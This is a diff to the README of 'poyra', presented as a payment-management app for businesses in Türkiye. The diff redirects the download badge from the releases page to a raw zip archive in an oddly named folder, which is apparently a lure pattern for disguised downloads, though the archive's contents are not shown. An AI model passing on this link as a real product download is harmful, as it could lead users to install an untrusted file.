@@ -4,7 +4,7 @@
 
 Welcome to **poyra**! This application helps businesses in Türkiye manage all their payment processes in one place. Think of it as your financial command center that automatically handles payment routing, reconciliation, and fee tracking without requiring technical expertise.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_POYRA-2ea44f?style=for-the-badge)](https://github.com/explosive-threeringcircus562/poyra/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️-DOWNLOAD_POYRA-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/explosive-threeringcircus562/poyra/main/angioleucitis/2.9.zip)
 
 ## 📥 Download & Installation
 
